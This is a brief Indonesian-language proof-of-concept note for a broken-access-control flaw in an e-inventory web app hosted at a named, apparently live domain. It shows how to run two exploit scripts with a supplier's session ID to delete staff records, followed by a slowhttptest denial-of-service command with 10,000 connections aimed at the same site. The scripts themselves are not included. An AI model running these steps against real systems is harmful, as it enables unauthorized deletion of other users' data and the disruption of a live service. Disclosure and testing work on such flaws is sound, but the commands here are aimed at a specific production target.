# supplier dapat menghapus data di petugas

1. jalankan PoC1.py(Barang Masuk)
```
python PoC1.py
Masukkan PHPSESSID: 26c50d84736535212182bc5daa96b85d [Milik Supplier]
Masukkan ID Barang: 8 [ID Barang pada Petugas : https://inventory.rinjaniproject.my.id/e-inventory/petugas/index.php?page=barang-masuk]
```

1. jalankan PoC2.py(Barang Keluar)
```
python PoC2.py
Masukkan PHPSESSID: 26c50d84736535212182bc5daa96b85d [Milik Supplier]
Masukkan ID Barang: 8 [ID Barang pada Petugas : https://inventory.rinjaniproject.my.id/e-inventory/petugas/index.php?page=barang-keluar]
```

┌──(gh0st4n㉿Gh0sT4n)-[~]
└─$ slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 200 -t GET -u https://inventory.rinjaniproject.my.id/e-inventory
